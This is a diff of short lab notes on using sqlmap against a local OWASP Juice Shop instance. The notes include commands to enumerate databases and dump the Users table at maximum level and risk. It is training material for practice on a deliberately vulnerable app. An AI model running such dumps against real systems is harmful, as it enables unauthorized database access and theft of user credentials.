@@ -3,7 +3,7 @@
 These examples are referencing OWASP Juice Shop where I performed an SQLite Dump
 
 ## Simple command 
-``sqlmap -u "http://localhost:3000/rest/products/search?q=apple" --batch --dbs
+`` sqlmap -u "http://localhost:3000/rest/products/search?q=apple" --batch --dbs
 
 **--batch = auto answer defaults (so it doesn’t prompt you)
 --dbs = enumerate databases**
@@ -27,4 +27,4 @@ These examples are referencing OWASP Juice Shop where I performed an SQLite Dump
 ## For dump 
 sqlmap -u "http://localhost:3000/rest/products/search?q=apple" --batch --level=5 --risk=3 --dbms=SQLite -T Users --dump
 
-**After -T, add any table name parameter listed after viewing the table list.
+** After -T, add any table name parameter listed after viewing the table list.
